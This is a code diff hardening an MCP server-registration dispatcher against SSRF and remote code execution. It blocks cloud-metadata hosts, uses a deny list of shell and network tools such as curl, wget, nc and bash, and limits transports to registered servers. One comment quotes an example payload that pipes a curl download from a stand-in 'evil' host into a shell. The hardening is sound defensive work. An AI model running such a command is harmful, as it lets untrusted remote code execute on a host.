@@ -8,11 +8,52 @@ API: mcp.register_server, mcp.list_servers, mcp.unregister_server,
 from __future__ import annotations
 
 import logging
+import os
 from collections.abc import Callable
+from urllib.parse import urlparse
 
 from .base import SubDispatcher
 
 logger = logging.getLogger(__name__)
+
+# 审计 E-5: MCP register_server 原连任意 URL + 起任意 stdio 命令无校验 = RCE/SSRF 汇.
+# 默认拒云元数据 IP (169.254.169.254 link-local) + 明显内网探测目标, 允许
+# localhost (本地 MCP 服务). FUSION_MCP_ALLOWLIST=host1,host2 限死可连主机 (逗号
+# 分隔, 设了则只放行该集合). stdio 命令挡 shell 直连 (sh -c / bash -c) + 网络拉
+# 取 (curl/wget), 防 stdio_cmd=["bash","-c","curl evil|sh"] RCE.
+_METADATA_IPS = ("169.254.169.254", "169.254.170.2", "100.100.100.200")
+_SSRF_BLOCK_HOSTS = ("metadata.google.internal", "metadata.aws.internal")
+_DANGEROUS_STDIO = (
+    "curl", "wget", "nc", "ncat", "bash", "sh", "zsh", "python", "python3",
+    "perl", "ruby", "node", "php",
+)
+
+
+def _mcp_validate_server(server_url: str, stdio_cmd) -> str | None:
+    # 返回拒绝原因 str, None = 放行. 先 allowlist (设了即闭集), 再元数据/SSRF 黑.
+    allow_raw = os.environ.get("FUSION_MCP_ALLOWLIST", "").strip()
+    if allow_raw:
+        allowed = {h.strip().lower() for h in allow_raw.split(",") if h.strip()}
+        host = (urlparse(server_url).hostname or "").lower() if server_url else ""
+        if stdio_cmd and not server_url:
+            # stdio 无 URL host, allowlist 模式下 stdio 需显式允许 (cmd[0]).
+            cmd0 = str(stdio_cmd[0]).lower() if stdio_cmd else ""
+            if cmd0 not in allowed:
+                return f"stdio cmd '{cmd0}' not in FUSION_MCP_ALLOWLIST"
+        elif host and host not in allowed:
+            return f"host '{host}' not in FUSION_MCP_ALLOWLIST"
+    if server_url:
+        host = (urlparse(server_url).hostname or "").lower()
+        if host in _METADATA_IPS or host in _SSRF_BLOCK_HOSTS:
+            return f"host '{host}' is a cloud-metadata/SSRF target, blocked"
+    if stdio_cmd:
+        cmd0 = str(stdio_cmd[0]).lower() if stdio_cmd else ""
+        if cmd0 in _DANGEROUS_STDIO:
+            return (
+                f"stdio cmd '{cmd0}' is a shell/network interpreter, blocked "
+                f"(use a direct binary path; sh -c/curl|sh is an RCE vector)"
+            )
+    return None
 
 
 class McpDispatcher(SubDispatcher):
@@ -43,6 +84,13 @@ class McpDispatcher(SubDispatcher):
         return mcp_reg
 
     async def _handle_register_server(self, params: dict) -> dict:
+        # 审计 E-5: 校验 server_url/stdio_cmd, 挡元数据 IP + shell/网络 RCE 向量.
+        server_url = params.get("server_url") or params.get("sse_url") or params.get("post_url")
+        stdio_cmd = params.get("stdio_cmd")
+        reason = _mcp_validate_server(server_url or "", stdio_cmd)
+        if reason:
+            logger.warning("mcp.register_server blocked: %s", reason)
+            return self._err(f"blocked by MCP safety policy: {reason}")
         mcp_reg = self._get_mcp_registry()
         try:
             registered = await mcp_reg.register_server(
@@ -80,11 +128,18 @@ class McpDispatcher(SubDispatcher):
         mcp_reg = self._get_mcp_registry()
         server_url = params.get("server_url", "")
         servers = mcp_reg.list_servers()
-        target_key = server_url or next(iter(servers), "")
+        # 审计 E-5: 只对已注册 server 建传输, 挡未注册任意 URL (SSRF 放大器).
+        if server_url:
+            if server_url not in servers:
+                logger.warning("mcp.list_resources blocked: server_url not registered")
+                return self._err("server_url is not registered; register first via mcp.register_server")
+            target_key = server_url
+        else:
+            target_key = next(iter(servers), "")
         if not target_key:
             return {"resources": [], "count": 0}
 
-        transport = MCPRegistry._build_transport(server_url=server_url)
+        transport = MCPRegistry._build_transport(server_url=target_key)
         if transport is None:
             return self._err("could not build transport for server")
         try:
@@ -102,11 +157,18 @@ class McpDispatcher(SubDispatcher):
         mcp_reg = self._get_mcp_registry()
         server_url = params.get("server_url", "")
         servers = mcp_reg.list_servers()
-        target_key = server_url or next(iter(servers), "")
+        # 审计 E-5: 只对已注册 server 建传输, 挡未注册任意 URL (SSRF 放大器).
+        if server_url:
+            if server_url not in servers:
+                logger.warning("mcp.list_prompts blocked: server_url not registered")
+                return self._err("server_url is not registered; register first via mcp.register_server")
+            target_key = server_url
+        else:
+            target_key = next(iter(servers), "")
         if not target_key:
             return {"prompts": [], "count": 0}
 
-        transport = MCPRegistry._build_transport(server_url=server_url)
+        transport = MCPRegistry._build_transport(server_url=target_key)
         if transport is None:
             return self._err("could not build transport for server")
         try:
